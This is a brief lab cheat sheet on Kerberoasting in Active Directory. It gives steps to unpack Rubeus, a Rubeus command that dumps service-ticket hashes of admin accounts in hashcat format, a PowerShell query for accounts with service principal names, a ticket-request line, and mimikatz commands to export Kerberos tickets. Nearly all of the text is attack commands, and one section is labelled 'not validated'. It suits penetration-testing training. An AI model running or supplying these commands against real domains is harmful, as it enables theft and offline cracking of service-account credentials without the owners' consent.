# Common Kerberoasting
> Domain User Account Context

1. Open Powershell.
2. `cd c:\Users\Public\Dekstop\LAB_FILES\assets`
3. `expand-archive c:\Users\Public\Desktop\LAB_FILES\assets`
4. `cd Rubeus-1.6.4\Rubeus-1.6.4`
5. `rubeus.exe`



---------------not validated------------------------

Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\Users\Public\hashes.txt





"get-aduser -filter * -properties ServicePrincipalName | Select SamAccountName, ServicePrincipalName | where {$_.ServicePrincipalName -ne $null} | fl

Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ""VULN SPN GOES HERE"""
"mimikatz
privilege::debug
kerberos::list /export"